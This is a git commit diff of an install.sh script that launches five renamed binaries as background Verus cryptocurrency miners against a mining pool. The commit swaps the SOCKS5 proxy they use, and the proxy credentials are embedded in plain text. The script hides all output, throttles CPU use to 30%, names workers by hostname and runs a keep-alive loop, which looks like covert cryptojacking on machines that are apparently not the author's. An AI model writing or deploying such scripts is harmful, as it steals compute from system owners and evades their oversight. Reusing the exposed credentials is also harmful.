82ebe7e3d4db6c6d85f94faaab0dcd9b43d2edc7
meronejas <95197442+meronejas@users.noreply.github.com>
2022-01-01 13:16:19 +0700

    Update install.sh

--- install.sh
+++ install.sh
@@ -9,9 +9,9 @@ chmod +x px5
 pool="stratum+tcp://verushash.na.mine.zergpool.com:3300"
 workername="$(cat /proc/sys/kernel/hostname)"
 thread="$(nproc --all)"
-cpulimit -l 30 ./px1 -a verus -o $pool -u DECyL1Nt3ktReAFLaqNTHp1BvxMCHxZcye.$workername -p c=DGB,mc=VRSC -t $thread -x socks5://aihzpnbr:dogmtwuiyn3a@185.126.65.95:6880 >/dev/null 2>&1 >/dev/null &
-cpulimit -l 30 ./px2 -a verus -o $pool -u DECyL1Nt3ktReAFLaqNTHp1BvxMCHxZcye.$workername -p c=DGB,mc=VRSC -t $thread -x socks5://aihzpnbr:dogmtwuiyn3a@185.126.65.95:6880 >/dev/null 2>&1 >/dev/null &
-cpulimit -l 30 ./px3 -a verus -o $pool -u DECyL1Nt3ktReAFLaqNTHp1BvxMCHxZcye.$workername -p c=DGB,mc=VRSC -t $thread -x socks5://aihzpnbr:dogmtwuiyn3a@185.126.65.95:6880 >/dev/null 2>&1 >/dev/null &
-cpulimit -l 30 ./px4 -a verus -o $pool -u DECyL1Nt3ktReAFLaqNTHp1BvxMCHxZcye.$workername -p c=DGB,mc=VRSC -t $thread -x socks5://aihzpnbr:dogmtwuiyn3a@185.126.65.95:6880 >/dev/null 2>&1 >/dev/null &
-cpulimit -l 30 ./px5 -a verus -o $pool -u DECyL1Nt3ktReAFLaqNTHp1BvxMCHxZcye.$workername -p c=DGB,mc=VRSC -t $thread -x socks5://aihzpnbr:dogmtwuiyn3a@185.126.65.95:6880 >/dev/null 2>&1 >/dev/null &
+cpulimit -l 30 ./px1 -a verus -o $pool -u DECyL1Nt3ktReAFLaqNTHp1BvxMCHxZcye.$workername -p c=DGB,mc=VRSC -t $thread -x socks5://a019xpj2-3va47yc:gad7w69xcf@socks-us.windscribe.com:1080 >/dev/null 2>&1 >/dev/null &
+cpulimit -l 30 ./px2 -a verus -o $pool -u DECyL1Nt3ktReAFLaqNTHp1BvxMCHxZcye.$workername -p c=DGB,mc=VRSC -t $thread -x socks5://a019xpj2-3va47yc:gad7w69xcf@socks-us.windscribe.com:1080 >/dev/null 2>&1 >/dev/null &
+cpulimit -l 30 ./px3 -a verus -o $pool -u DECyL1Nt3ktReAFLaqNTHp1BvxMCHxZcye.$workername -p c=DGB,mc=VRSC -t $thread -x socks5://a019xpj2-3va47yc:gad7w69xcf@socks-us.windscribe.com:1080 >/dev/null 2>&1 >/dev/null &
+cpulimit -l 30 ./px4 -a verus -o $pool -u DECyL1Nt3ktReAFLaqNTHp1BvxMCHxZcye.$workername -p c=DGB,mc=VRSC -t $thread -x socks5://a019xpj2-3va47yc:gad7w69xcf@socks-us.windscribe.com:1080 >/dev/null 2>&1 >/dev/null &
+cpulimit -l 30 ./px5 -a verus -o $pool -u DECyL1Nt3ktReAFLaqNTHp1BvxMCHxZcye.$workername -p c=DGB,mc=VRSC -t $thread -x socks5://a019xpj2-3va47yc:gad7w69xcf@socks-us.windscribe.com:1080 >/dev/null 2>&1 >/dev/null &
 while :; do echo "system true"; sleep 2m; done
